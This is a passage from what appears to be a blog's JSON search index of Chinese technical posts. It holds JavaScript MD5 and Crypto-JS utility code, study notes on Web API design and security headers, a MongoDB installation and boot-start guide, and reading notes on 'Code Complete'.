4], 7, -176418897); d = FF(d, a, b, c, m[i + 5], 12, 1200080426); c = FF(c, d, a, b, m[i + 6], 17, -1473231341); b = FF(b, c, d, a, m[i + 7], 22, -45705983); a = FF(a, b, c, d, m[i + 8], 7, 1770035416); d = FF(d, a, b, c, m[i + 9], 12, -1958414417); c = FF(c, d, a, b, m[i + 10], 17, -42063); b = FF(b, c, d, a, m[i + 11], 22, -1990404162); a = FF(a, b, c, d, m[i + 12], 7, 1804603682); d = FF(d, a, b, c, m[i + 13], 12, -40341101); c = FF(c, d, a, b, m[i + 14], 17, -1502002290); b = FF(b, c, d, a, m[i + 15], 22, 1236535329); a = GG(a, b, c, d, m[i + 1], 5, -165796510); d = GG(d, a, b, c, m[i + 6], 9, -1069501632); c = GG(c, d, a, b, m[i + 11], 14, 643717713); b = GG(b, c, d, a, m[i + 0], 20, -373897302); a = GG(a, b, c, d, m[i + 5], 5, -701558691); d = GG(d, a, b, c, m[i + 10], 9, 38016083); c = GG(c, d, a, b, m[i + 15], 14, -660478335); b = GG(b, c, d, a, m[i + 4], 20, -405537848); a = GG(a, b, c, d, m[i + 9], 5, 568446438); d = GG(d, a, b, c, m[i + 14], 9, -1019803690); c = GG(c, d, a, b, m[i + 3], 14, -187363961); b = GG(b, c, d, a, m[i + 8], 20, 1163531501); a = GG(a, b, c, d, m[i + 13], 5, -1444681467); d = GG(d, a, b, c, m[i + 2], 9, -51403784); c = GG(c, d, a, b, m[i + 7], 14, 1735328473); b = GG(b, c, d, a, m[i + 12], 20, -1926607734); a = HH(a, b, c, d, m[i + 5], 4, -378558); d = HH(d, a, b, c, m[i + 8], 11, -2022574463); c = HH(c, d, a, b, m[i + 11], 16, 1839030562); b = HH(b, c, d, a, m[i + 14], 23, -35309556); a = HH(a, b, c, d, m[i + 1], 4, -1530992060); d = HH(d, a, b, c, m[i + 4], 11, 1272893353); c = HH(c, d, a, b, m[i + 7], 16, -155497632); b = HH(b, c, d, a, m[i + 10], 23, -1094730640); a = HH(a, b, c, d, m[i + 13], 4, 681279174); d = HH(d, a, b, c, m[i + 0], 11, -358537222); c = HH(c, d, a, b, m[i + 3], 16, -722521979); b = HH(b, c, d, a, m[i + 6], 23, 76029189); a = HH(a, b, c, d, m[i + 9], 4, -640364487); d = HH(d, a, b, c, m[i + 12], 11, -421815835); c = HH(c, d, a, b, m[i + 15], 16, 530742520); b = HH(b, c, d, a, m[i + 2], 23, -995338651); a = II(a, b, c, d, m[i + 0], 6, -198630844); d = II(d, a, b, c, m[i + 7], 10, 1126891415); c = II(c, d, a, b, m[i + 14], 15, -1416354905); b = II(b, c, d, a, m[i + 5], 21, -57434055); a = II(a, b, c, d, m[i + 12], 6, 1700485571); d = II(d, a, b, c, m[i + 3], 10, -1894986606); c = II(c, d, a, b, m[i + 10], 15, -1051523); b = II(b, c, d, a, m[i + 1], 21, -2054922799); a = II(a, b, c, d, m[i + 8], 6, 1873313359); d = II(d, a, b, c, m[i + 15], 10, -30611744); c = II(c, d, a, b, m[i + 6], 15, -1560198380); b = II(b, c, d, a, m[i + 13], 21, 1309151649); a = II(a, b, c, d, m[i + 4], 6, -145523070); d = II(d, a, b, c, m[i + 11], 10, -1120210379); c = II(c, d, a, b, m[i + 2], 15, 718787259); b = II(b, c, d, a, m[i + 9], 21, -343485551); a = (a + aa) &gt;&gt;&gt; 0; b = (b + bb) &gt;&gt;&gt; 0; c = (c + cc) &gt;&gt;&gt; 0; d = (d + dd) &gt;&gt;&gt; 0; &#125; return crypt.util.endian([a, b, c, d]);&#125;;// Auxiliary functionsmd5._ff = function(a, b, c, d, x, s, t) &#123; var n = a + (b &amp; c | ~b &amp; d) + (x &gt;&gt;&gt; 0) + t; return ((n &lt;&lt; s) | (n &gt;&gt;&gt; (32 - s))) + b;&#125;;md5._gg = function(a, b, c, d, x, s, t) &#123; var n = a + (b &amp; d | c &amp; ~d) + (x &gt;&gt;&gt; 0) + t; return ((n &lt;&lt; s) | (n &gt;&gt;&gt; (32 - s))) + b;&#125;;md5._hh = function(a, b, c, d, x, s, t) &#123; var n = a + (b ^ c ^ d) + (x &gt;&gt;&gt; 0) + t; return ((n &lt;&lt; s) | (n &gt;&gt;&gt; (32 - s))) + b;&#125;;md5._ii = function(a, b, c, d, x, s, t) &#123; var n = a + (c ^ (b | ~d)) + (x &gt;&gt;&gt; 0) + t; return ((n &lt;&lt; s) | (n &gt;&gt;&gt; (32 - s))) + b;&#125;;// Package private blocksizemd5._blocksize = 16;md5._digestsize = 16;module.exports = function(message, options) &#123; if (message === undefined || message === null) throw new Error(&#x27;Illegal argument &#x27; + message); var digestbytes = crypt.util.wordsToBytes(md5(message, options)); return options &amp;&amp; options.asBytes ? digestbytes : options &amp;&amp; options.asString ? bin.bytesToString(digestbytes) : crypt.util.bytesToHex(digestbytes);&#125;; 以下是 crypto 模块 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185/*! * Crypto-JS v1.1.0 * http://code.google.com/p/crypto-js/ * Copyright (c) 2009, Jeff Mott. All rights reserved. * http://code.google.com/p/crypto-js/wiki/License */const Crypto = &#123;&#125;;(function()&#123;var base64map = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;// Crypto utilitiesvar util = Crypto.util = &#123; // Bit-wise rotate left rotl: function (n, b) &#123; return (n &lt;&lt; b) | (n &gt;&gt;&gt; (32 - b)); &#125;, // Bit-wise rotate right rotr: function (n, b) &#123; return (n &lt;&lt; (32 - b)) | (n &gt;&gt;&gt; b); &#125;, // Swap big-endian to little-endian and vice versa endian: function (n) &#123; // If number given, swap endian if (n.constructor == Number) &#123; return util.rotl(n, 8) &amp; 0x00FF00FF | util.rotl(n, 24) &amp; 0xFF00FF00; &#125; // Else, assume array and swap all items for (var i = 0; i &lt; n.length; i++) n[i] = util.endian(n[i]); return n; &#125;, // Generate an array of any length of random bytes randomBytes: function (n) &#123; for (var bytes = []; n &gt; 0; n--) bytes.push(Math.floor(Math.random() * 256)); return bytes; &#125;, // Convert a string to a byte array stringToBytes: function (str) &#123; var bytes = []; for (var i = 0; i &lt; str.length; i++) bytes.push(str.charCodeAt(i)); return bytes; &#125;, // Convert a byte array to a string bytesToString: function (bytes) &#123; var str = []; for (var i = 0; i &lt; bytes.length; i++) str.push(String.fromCharCode(bytes[i])); return str.join(&quot;&quot;); &#125;, // Convert a string to big-endian 32-bit words stringToWords: function (str) &#123; var words = []; for (var c = 0, b = 0; c &lt; str.length; c++, b += 8) words[b &gt;&gt;&gt; 5] |= str.charCodeAt(c) &lt;&lt; (24 - b % 32); return words; &#125;, // Convert a byte array to big-endian 32-bits words bytesToWords: function (bytes) &#123; var words = []; for (var i = 0, b = 0; i &lt; bytes.length; i++, b += 8) words[b &gt;&gt;&gt; 5] |= bytes[i] &lt;&lt; (24 - b % 32); return words; &#125;, // Convert big-endian 32-bit words to a byte array wordsToBytes: function (words) &#123; var bytes = []; for (var b = 0; b &lt; words.length * 32; b += 8) bytes.push((words[b &gt;&gt;&gt; 5] &gt;&gt;&gt; (24 - b % 32)) &amp; 0xFF); return bytes; &#125;, // Convert a byte array to a hex string bytesToHex: function (bytes) &#123; var hex = []; for (var i = 0; i &lt; bytes.length; i++) &#123; hex.push((bytes[i] &gt;&gt;&gt; 4).toString(16)); hex.push((bytes[i] &amp; 0xF).toString(16)); &#125; return hex.join(&quot;&quot;); &#125;, // Convert a hex string to a byte array hexToBytes: function (hex) &#123; var bytes = []; for (var c = 0; c &lt; hex.length; c += 2) bytes.push(parseInt(hex.substr(c, 2), 16)); return bytes; &#125;, // Convert a byte array to a base-64 string bytesToBase64: function (bytes) &#123; // Use browser-native function if it exists if (typeof btoa == &quot;function&quot;) return btoa(util.bytesToString(bytes)); var base64 = [], overflow; for (var i = 0; i &lt; bytes.length; i++) &#123; switch (i % 3) &#123; case 0: base64.push(base64map.charAt(bytes[i] &gt;&gt;&gt; 2)); overflow = (bytes[i] &amp; 0x3) &lt;&lt; 4; break; case 1: base64.push(base64map.charAt(overflow | (bytes[i] &gt;&gt;&gt; 4))); overflow = (bytes[i] &amp; 0xF) &lt;&lt; 2; break; case 2: base64.push(base64map.charAt(overflow | (bytes[i] &gt;&gt;&gt; 6))); base64.push(base64map.charAt(bytes[i] &amp; 0x3F)); overflow = -1; &#125; &#125; // Encode overflow bits, if there are any if (overflow != undefined &amp;&amp; overflow != -1) base64.push(base64map.charAt(overflow)); // Add padding while (base64.length % 4 != 0) base64.push(&quot;=&quot;); return base64.join(&quot;&quot;); &#125;, // Convert a base-64 string to a byte array base64ToBytes: function (base64) &#123; // Use browser-native function if it exists if (typeof atob == &quot;function&quot;) return util.stringToBytes(atob(base64)); // Remove non-base-64 characters base64 = base64.replace(/[^A-Z0-9+\\/]/ig, &quot;&quot;); var bytes = []; for (var i = 0; i &lt; base64.length; i++) &#123; switch (i % 4) &#123; case 1: bytes.push((base64map.indexOf(base64.charAt(i - 1)) &lt;&lt; 2) | (base64map.indexOf(base64.charAt(i)) &gt;&gt;&gt; 4)); break; case 2: bytes.push(((base64map.indexOf(base64.charAt(i - 1)) &amp; 0xF) &lt;&lt; 4) | (base64map.indexOf(base64.charAt(i)) &gt;&gt;&gt; 2)); break; case 3: bytes.push(((base64map.indexOf(base64.charAt(i - 1)) &amp; 0x3) &lt;&lt; 6) | (base64map.indexOf(base64.charAt(i)))); break; &#125; &#125; return bytes; &#125;&#125;;// Crypto mode namespaceCrypto.mode = &#123;&#125;;&#125;)();module.exports = Crypto;","categories":[{"name":"文章","slug":"文章","permalink":"http://example.com/categories/%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"},{"name":"微信","slug":"微信","permalink":"http://example.com/tags/%E5%BE%AE%E4%BF%A1/"}]},{"title":"微信支付 mch_id 参数格式错误","slug":"微信支付 mch_id 参数格式错误","date":"2018-07-27T03:26:25.000Z","updated":"2024-09-21T23:12:52.156Z","comments":true,"path":"2018/07/27/微信支付 mch_id 参数格式错误/","permalink":"http://example.com/2018/07/27/%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98%20mch_id%20%E5%8F%82%E6%95%B0%E6%A0%BC%E5%BC%8F%E9%94%99%E8%AF%AF/","excerpt":"","text":"为了避免使用全局变量，有两个办法 办法一：设计一个函数，并将函数内的方法添加到全局对象 window 上（这种方法虽然可以避免全局变量，却难免要应对全局对象上方法的命名冲突） 办法二：设计一个对象，对象里面存着变量和方法，但它不直接通过定义获得（不然会变成全局变量），而是通过定义匿名函数并马上运行它来返回所需要的对象","categories":[{"name":"文章","slug":"文章","permalink":"http://example.com/categories/%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"},{"name":"微信","slug":"微信","permalink":"http://example.com/tags/%E5%BE%AE%E4%BF%A1/"}]},{"title":"Web API 的设计和开发","slug":"Web API 的设计和开发","date":"2018-07-11T01:14:00.000Z","updated":"2024-09-22T23:08:41.984Z","comments":true,"path":"2018/07/11/Web API 的设计和开发/","permalink":"http://example.com/2018/07/11/Web%20API%20%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%BC%80%E5%8F%91/","excerpt":"","text":"什么是 Web API 软件组件的外部接口；为了从外部调用软件的功能，需要指定调用该功能应该遵守的规则，这些规则，即是 API； API 的重要性：通过使用API，避免大包大揽，将一些非核心功能开放给第三方来开发，通过分工建立生态，建立更加强大的生命力； 面向外部大量开发者群体的 API 和面向内部少量开发群体的 API，在设计思想上会有所区别，前者侧重普适通用性，后者侧重上手，二者对于“优美”的定义不同； 响应数据的格式 JSONP 目的：规避同源策略的限制 用法：将响应数据作为 script 进行引用； 原理：因为 Script 的加载不受同源策略约束； 建议：能不支持尽量不支持，原因：安全问题，可以会被攻击； 数据内部结构 原则：尽量减少 API 请求次数，一次性返回所需要的数据； 让用户选择响应的内容；指定单个字段太麻烦的话，可以考虑使用小组及组合或嵌套的策略，将所需要的字段根据场景做进一步的抽象； 封装可以让响应格式统一，但有点浪费 HTTP 协议本身自带的封装效果； 数据尽量扁平化，除非层级有绝对优势才考虑使用层级； 列表建议做 { } 封装，原因：封装后不符 js 语法，可以避免攻击； 列表的响应，可以添加 hasNext 字段，来表示是否还有后续内容； 数据的格式 JSON：驼峰命名法 性别：GENDER 是社会意义的，SEX 是生物意义的； 日期的格式： RFC3339，2015-10-12T11:30:22+09:00 大数据：由于JS处理64bit长度的局限性，可以转成字符串传输； 响应数据的格式 出错信息用状态码表示，遵循HTTP的规范，即2开头表示成功，4开头表示客户端请求有误，5开头表示服务器内部处理有误（原因：更加易懂）； 向客户端返回详细的错误信息，以便其了解原因，方便调试 可以考虑使用 devMsg 和 userMsg 来区分显示给用户和开发人员的消息内容； 另外还可以加上 info 字段放上文档链接，方便人员查询错误代码的具体意义； 有时需要返回意义不明确的信息，例如登录错误（涉及安全），好友屏蔽（涉及隐私）等；开发环境和生产环境也可以做区分，开发环境返回真实的信息，生产环境返回模糊的信息； 尽量利用 HTTP 协议 尽量使用通用规范的好处：让他人的学习成本更低，易于理解； 状态码：2、3、4、5，每个数字下面，都对应有几十种细分，非常丰富，所以应尽量使用它们来表示想要的状态； 202：表示服务端已经开始处理，但还没有弄好；此时可以在响应消息的 Retry-after 字段里面，放上时间（目测这个功能可以用来在客户端显示进度？） Etag：一种缓存校验机制；缓存的目的是提高通信效率，但可能存在的问题是如何获取最新版本，此时通过给数据的版本加上唯一标识符，即可以知悉资源是否更新；如果标识符发生变化，则表示需要获取最新版本； 3开头，其中的强制重定向，可以用来避免客户端在原页面重复进行操作，当请求处理成功后，返回给客户端一个新的页面，这在付款、下单、下载资源等场景非常有用； 4开头：认证错，授权错，资源不存在，资源冲突，方法错，格式不支持，曾经存在，超时，太长太大，超次数 5开头：内部错，存在不可用； 缓存与HTTP规范 涉及方：客户端缓存、客户端代理服务器缓存、服务端代理服务器缓存； 过期模型：通过在首部指定过期时间（绝对时间，相对时间等），可以有效减少请求次数； 校验模型：通过判断资源是否更新（虽然没有减少请求次数，但适用于大数据交互的场景）；通过 Entity Tag 来实现，即 ETAG，在首部加上这个信息用于判断；根据场景可分为强验证和弱验证两种； 启发式过期：服务器端没有指定具体的过期时间，客户端（浏览器）自己判断；比如首部中有 last modified 字段，假设为1年前，则客户端可以猜测缓存有效期可以设置为1年左右；如果 last modified 是昨天，则缓存有效期可以设置为半天； 不希望缓存： no-cache（其实有缓存，只是每次都需要验证），no-store（真的没有缓存） vary 字段：用来增加资源的唯一识别，除了 URI 外，再加上 vary 批定的字段，只有这些字段的值全部一致时，才读取缓存数据，如果不一致，则重新到服务器进行请求； cache-control 支持多种参数，其中有一种 stale-while-revalidate，假设该字段值设置为1000，则表示1000到期后，缓存仍然有效，并且，此时会异步去服务器请求最新的数据；这样的好处是即提高了响应速度，也能保证数据及时更新； 媒体类型：由于有时客户端采用的第三方库，会根据返回的媒体类型进行不同的操作，因为返回正确的媒体类型很重要，避免客户端处理出错； x- 开头的媒体类型，表示该类型尚未在官方组织正式注册；但新的 RFC 规范已经废止通过这种方式来自定义媒体类型，而采用了“注册树”的办法； x- 也常用于表示私有首部； API 的设计要方便更改 常用做法：在 URI 中嵌入主版本号 最大程度的减少 API 的更新；如果必须更新，注意向下兼容； 发布新版 API 后，如果需要停止对老版本的支持，则建议正常先保留老版本半年； 安全性与可靠性 安全问题 劫持服务端与客户端之间的通讯信息； 应对措施：使用 HTTPS 进行加密；缺点：会增加一些访问的时间，性能有所下降； 攻击服务器获取服务端的数据； 攻击类型 XSS：在传输的数据中，注入恶意的代码（例如 js），然后触发它被执行；例如先伪造一个 URL，吸引用户点击，之后传输包含恶意代码的网页给用户，用户端的浏览器显示该网页时，触发恶意代码被执行；该攻击有3种类型，其中一些只危害用户端，另2种会危害服务器端 防范：对用户的输入进行检查，确保其中不包含恶意的代码 XSRF：跨站点请求伪造；站点 B 伪造成用户的身份登录站点 A 进行操作； 前提：用户登录了 站点 A，同时，用户打开了站点 B 原理：当用户点击 B 时，执行恶意代码，获取了站点 A 给用户的 Cookie，凭借这个 Cookie，站点 B 假装自己是用户，向站点 A 发起了非法的请求； 防范：除了 Cookie 外，增加其他验证用户身份的方式；比如： 只能使用 POST 方法进行数据更新的操作（原因：因为 GET 方法缺少验证） 使用 TOKEN 验证； 使用 一些只能人工识别的验证方式，例如识别图片上面的字符 来自怀有恶意的用户的攻击 修改参数达到有利自己的目的（防范：仔细检查参数的有效性） 多次发送（防范：增加状态的判断，例如通过增加虚拟的订单和收据，然后根据单据的状态变化，来判断是否允许再次操作） 同安全相关的 HTTP 首部 X-XSS-Protection: 1 开户后，浏览器可以检测和防御 XSS 攻击（Chrome 和 Safari 此功能是默认开启的，且无法禁用） X-Frame-Options: Deny 攻击者在用户的页面上添加透明的 iFrame 元素，当用户点击时，执行了恶意代码（即点击劫持） Content-Security-Policy: default-src ‘none’ 用于指定读取的HTML内元素指向的资源范围（例如：IMG, SCRIPT, LINK 等元素），用于降低 XSS 攻击的风险； Strict-Transport-Security： max-age&#x3D;15768000 预先告知浏览器只能通过 HTTPS 进行访问 max-age 值，即是告知浏览器，在这个时间期限内，只能使用 HTTPS 访问； 该首部只有通过 HTTPS 发放时才会生效，通过 HTTP 发放是不生效的； 缺点：第一次使用 HTTPS 访问前，如果已经通过 HTTP 访问过，则该首部不会产生效果 Set-Cookie: session&#x3D;e827ea…..3i1689jp; Path&#x3D;&#x2F;; Secure; HttpOnly Secure 表示 session 值只能在 HTTPS 下发送，HTTP 下不发送（避免泄露） HttpOnly 表示仅在 HTTP 通信方式下，才能读取该 session 值，不能通过其他方式读取，避免被恶意脚本获取 session 值； 应对大规模访问 限制每个用户的访问： 前提：需要能够识别用户 方法：给每个用户设置 Token 或 key 来识别； 设置访问次数的上限：时间单位需要考虑用户如果超出限制，需要等待多久； 当超出次数限制时，返回 429 状态码，Too many requests 告知用户详细的限制信息，包括：单位时间允许次数，剩余次数，重置时间； 方式一：通过专门的API，让用户主动查询 方式二：在返回的消息的首部注明，包括： X-RateLimit-Limit，单位时间的访问上限； X-RateLimit-Remaining，剩余的访问次数； X-RateLimit-Reset，访问次数重置的时间； 服务器端可使用 Redis 来记录限制信息； 附录 公开 Web API 的准备工作 提供文档，可参考 https://apiblueprint.org 倡导的规范； 提供沙盒，让用户可以在这个环境中随意测试； 提供 console，让用户可以通过浏览器对 API 进行操作测试；例如：https://developers.facebook.com/tools/explorer 提供 SDK，让开发人员能够快速上手使用，避免自己写代码进行连接的工作；缺点：如果 API 更新频率很高，则维护 SDK 的工作量也很大； 确认清单 URI 是否短小且容易输入 URI 是否能够让人一眼看懂； URI 是否只由小写字母组成； URI 是否容易修改； URI 是否反映了服务端的架构； URI 规则是否统一； 是否使用了合适的 HTTP 方法； URI 用到的单词是否和业界相同； URI 用到的名词是否使用了复数形式； URI 里面有没有空格及需要编码的字符； URI 单词之间是否使用了连字符； 分布的设计是否恰当； 登录是否使用了 OAuth 2.0 响应数据格式是否默认使用 JSON 是否支持通过查询参数指定数据格式； 是否支持不必要的 JSONP 响应数据的内容是否支持客户端指定； 响应数据是否存在不必要的封装； 响应数据的结构是否尽量扁平化； 响应数据是否使用对象描述，而非数组 响应数据使用的单词名称是否和业界一致； 响应数据的名称是否尽可能短小； 响应数据的多个单词是否使用了连字符； 响应数据名称是否使用了奇怪的缩写； 响应数据单词的单复数形式是否和内容一致； 出错时的响应数据是否包含有助于客户分析原因的信息； 出错时有没有返回 HTML 数据； 有没有返回合适的状态码； 服务器在维护时有没有返回 503 状态码； 有没有返回合适的媒体类型； 必要时是否支持 CORS 有没有返回 Cache-Control，ETag，Last-Modified, Vary 等首部信息，以便客户端制定合适的缓存策略； 不想缓存的数据是否指定 no-cache 或 no-store 有没有对 API 进行版本管理 API 版本的命名是否遵守版本控制规范； 有没有在 URI 里嵌入主版本编号，并且能够让人一目了然； 有没有考虑 API 终止提供时的相关事项； 有没有在文档里注明 API 的最低提供期限； 有没有使用 HTTPS 提供 API 有没有执行 JSON 转义； 能不能识别 X-Requested-With 首部，让浏览器无法通过 Scrip 元素读取 JSON 数据； 通过浏览器访问的API 有没有使用 XSRF Token API 在接收参数时，有没有检查非法参数； 能否避免重复发送，导致数据多次更新； 有没有在响应消息里添加各种增强安全的首部； 有没有实施访问限速； 对预想的用例来说，限制的次数是否可能设置得过少；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"API","slug":"API","permalink":"http://example.com/tags/API/"}]},{"title":"Linux MongoDB 安装并设置开机启动","slug":"Linux MongoDB 安装并设置开机启动","date":"2018-06-10T09:52:30.000Z","updated":"2024-09-21T23:16:38.131Z","comments":true,"path":"2018/06/10/Linux MongoDB 安装并设置开机启动/","permalink":"http://example.com/2018/06/10/Linux%20MongoDB%20%E5%AE%89%E8%A3%85%E5%B9%B6%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/","excerpt":"","text":"安装 MongoDB（注：以下是基于 linux 系统） 进入源码目录（注：一般将下载的源码文件统一放在这个目录下，当然也可以不放这里，看个人需要）1cd /usr/local/src 下载安装包1wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.6.5.tgz 注：此处假设最新版本为 3.6.5，如果不是要下载这个版本，则相应修改 #####解压安装包 1tar -zxvf mongodb-linux-x86_64-3.6.5.tgz #####将解压后的文件夹，移动到安装目录注：此处假设安装目录为：&#x2F;usr&#x2F;local&#x2F;mongodb，此目录不用提前创建，mv 命令会自动创建文件夹并重命名为 mongodb； 1mv mongodb-linux-x86_64-3.6.5 /usr/local/mongodb #####检查文件夹移动成功 1ls /usr/local/mongodb/bin 如果成功，此目录下会显示此目录下有如下一些文件 1mongod mongo mongodump mongoexport mongoimport...... 将 MongoDB 的可执行命令文件夹 bin 添加到 PATH 路径中注：此步骤可选，其好处是每次执行命令不用指定路径，方便一些； 1export PATH=/usr/local/mongodb/bin:$PATH #####至此， MongoDB 安装完毕 #设置开机启动#####创建数据存放目录 1mkdir /data/db 注：此处假设数据存放目录为 &#x2F;data&#x2F;db，可根据实际情况更改为其他路径；#####创建日志存放目录 1mkdir /data/logs 注：此处假设数据存放目录为 &#x2F;data&#x2F;logs，可根据实际情况需要更改为其他路径；#####创建日志存放文件 1touch /data/logs/mongodb.log #####创建启动的配置文件 1vi /usr/local/mongodb/bin/mongodb.conf 在文件中输入以下内容 1234dbpath = /data/db #数据存放路径，与刚才创建的目录一致logpath = /data/logs/mongodb.log #日志文件存放路径；port = 27017 #端口fork = true #以守护程序的方式启用，即可以在后台运行 保存退出；######编辑开机启动文件 1vi /etc/rc.local 在文件底部增加如下一行语句，以便启动时执行； 1/usr/local/mongodb/bin/mongod --config /usr/local/mongodb/bin/mongodb.conf 保存退出； 运行如下命令，启动 mongodb1/usr/local/mongodb/bin/mongod --config /usr/local/mongodb/bin/mongodb.conf 运行如下命令，检查 mongodb 启动成功1/usr/local/mongodb/bin/mongo 如果成功，界面上会出现如下提示： 重启，输入以下命令，检查开机启动是否设置成功1/usr/local/mongodb/bin/mongo 如果成功，会出现和以上相同的提示界面： 注：如果在安装的时候，有将 mongo 命令添加到 PATH，则此时只需要输入 1mongo","categories":[{"name":"运维","slug":"运维","permalink":"http://example.com/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"服务器","slug":"服务器","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}]},{"title":"代码大全","slug":"代码大全","date":"2018-05-09T00:41:00.000Z","updated":"2024-09-22T23:08:41.990Z","comments":true,"path":"2018/05/09/代码大全/","permalink":"http://example.com/2018/05/09/%E4%BB%A3%E7%A0%81%E5%A4%A7%E5%85%A8/","excerpt":"","text":"欢迎进入软件构建的世界 什么是软件构建：软件开发过程涉及众多环节，构建涉及其中的一部分环节，在这些环节中，有些是构建的核心（编码与测试），有些则只是部分覆盖（详细设计，单元测试，集成测试）； 软件构建为何如此重要：构建占据最大的人工成本和时间成本，它是所有环节中唯一不可或缺的；它的成败，直接决定了整个软件成败； 如何阅读这本书 从头到尾读：从第2章开始 挑特定的主题读，然后向外延伸：从第6章“可以工作的类”开始； 不知道如何开始：阅读第3.2节，辨明所从事的软件的类型； 用隐喻来更充分的理解软件开发 建筑 三思而后行：前期准备 前期准备的重要性：好的前期准备，可以为后期的构建节省成本，不管是人力上还是时间上； 辨明你从事的软件的类型 不同类型的软件项目，需要在前期准备工作和构建工作之间所花的时间做出平衡； 三种类型： 商业系统：普通网站，库存管理，游戏，信息管理系统，工资系统 使命攸关的系统：嵌入式软件，游戏，盒装软件，软件工具，Web Services 性命攸关的系统：航空软件，嵌入式软件，医疗设备，操作系统，盒装软件； 开发方式： 迭代式开发，适用于需求不明确不稳定的场景 瀑布式开发，适用于需求稳定明确，设计直截了当，理解透彻的场景； 问题定义的先决条件 对这个系统要解决的问题做出清楚的陈述 以客户的语言进行陈述，例如：做为（角色），我想（目标），这样可以（利益）； 陈述中应不涉及任何可能的解决方案；（后续的开发设计时，将需要基于问题层面进行思考和设计） 需求的先决条件 需求：详细描述软件系统应该做什么，明确的需求，用户可以自己把握软件能够做什么，而不是由程序员猜测，程序员之间也可以避免分歧；在早期发现错误的需求，改动成本最低，少则5-10倍，多则100倍； 减少需求变更的方法 使用一份需求规范核对表，对需求的质量进行评估，如果质量不合格，把它改到合格； 确保每个人都知道需求变更的费用代价和时间代价；当用户提出变更时，行动之前，给对方变更的成本表和进度表； 建立一套变更审批程序，比如设立一个变更控制委员会，通过审批机制的方式，让变更以更加有节奏的方式进行，而不是随意打乱当前的工作； 使用更能适应变更的开发方法，例如使用：高保真原型 + 敏捷开发；（项目上线后，正常会有一个业务流程，用户在这个流程中录入数据，一环一环的进行下去，开发的时候，最好能够按这个顺序进行，这样可以实现迭代交付，不然如果先完成了后边的流程，前面的流程缺失，无法实现迭代交付） 如果上面的方法都无法实施，则应该放弃这个项目； 考虑项目的商业价值，很多听上去很棒的功能点，当结合商业价值考虑的时候，可能它的实现就不是很有必要了； 需求核对表 针对功能需求 是否详细定义了全部输入？包括来源、精度、取值范围、频率等； 是否详细定义了全部输出？包括目的地、精度、取值范围、频率、输出格式等； 是否详细定义了所有的硬件和软件接口？ 是否详细定义了所有的外部通信接口？ 是否列出了所有用户想做的事情？ 是否详细定义了每个任务需要用到的数据？以及每个任务要得到的数据？ 针对非功能需求（质量需求） 可选性：操作是否必需 时间：用户期望的响应时间、处理时间、数据传输率、系统吞吐量等； 安全可靠性：安全级别、软件失灵的后果、重要信息保存、错误检测恢复； 空间：内存与磁盘大小需求； 可维护性：特定功能变更、操作环境变更、外部接口变更 定义：成功的定义、失败的定义 需求的质量 用户性：是否使用用户的语言来描述需求？用户是否也这么认为？ 冲突与权衡：不同需求之间是否存在冲突？不同非功能特性的优先级？ 不包含方案：需求是否不包含解决方案？ 详细度：需求是否在详细程度上保持一致的水平？ 清晰度：需求是否描述清晰，并可以交给另外的独立小组开发？他们能否理解？开发人员也这么认为吗？ 相关性：每个需求条款是否与待解决的问题和解决方案相关？是否能够从条款中找到问题领域的根源？ 可测性：每个需求是否可以测试？是否可以独立测试，以验证是否满足各项需求？ 变更度：是否详细描述所有对需求可能的变更？以及变更的可能性？ 需求的完备性 未知度：对于在开发之前无法详细了解的信息，是否注明？ 完备度：是否只要产品满足了需求，即是可以接受的？ 健康性：是否去除了那些只为了安抚客户或老板的不可能实现的需求？ 架构的先决条件 架构的质量决定了系统的概念完整性，它将工作分成几个部分，使多个开发者或者多个开发团队可以独立工作； 架构的组成部分 程序组织：定义程序的主要构造块，以及它们的主要责任，以概括的形式对系统做一个综述，并写上曾经考虑过的其他备选方案，以及选择当前方案的原因； 主要的类：80&#x2F;20 法则，每个主要的类的责任，如何与其他类交互；包含类的继承体系，状态转换，对象持久化等描述（例如：客户端信息保持30秒更新一次）； 数据设计：描述所用到的主要文件和数据表的设计，详细定义所用数据库的高层组织结构和内容（什么是高层组织结构？）； 业务规则：如果架构的设计依赖于特定的业务规则，则应该详细描述这些规则，以及这些规则对设计的影响； 用户界面设计：模块化，让用户界面的变更不影响程序的其他部分； 资源管理：描述管理稀缺资源的计划，包括数据库的连接、线程、句柄等；估算正常情况和极端情况下的资源使用量（在资源紧张的驱动程序开发和嵌入式开发，这点尤为重要） 安全性：建立威胁模型；描述实现设计层面和代码层面的安全性的方法；包括：处理缓冲区的方法、处理非受信数据的规则、消息的加密、内存中数据的保护等； 性能：如果需要关注性能，则需求中应该详细定义性能指标；架构应该提供数据，解释为什么可以达到这些指标；如果某些部分达不到，则应指出风险；如果某些部分需要采用特定算法和数据结构以达到性能指标，也应该指出来； 可伸缩性：如何应对用户数量、服务器数量、网络节点数量、数据库记录的长度、交易量等的增长；如果系统不会增长，则架构应描述这一假设； 互用性：如果需要和其他软硬件共享数据或资源，则应描述如何完成这一任务； 本地化：如何翻译一个程序，以支持当地特定语言的工作；如何无需更改代码的维护不同语言所用的字符集； 输入输出：定义读取策略，look-ahead, look-behind, 或 just-in-time； 错误处理：纠正or检测、主动or被动、如何传播错误、错误消息的处理有何约定、如何处理异常、在哪个层次处理错误、每个类在验证其输入数据有效性时的责任、使用环境内建机制or自建； 容错性：如果出现误差，如何处理误差； 可行性：应论证系统的技术可行性，如果有某一方面无法实现，解释原因；务必在构建前解决掉这些风险； 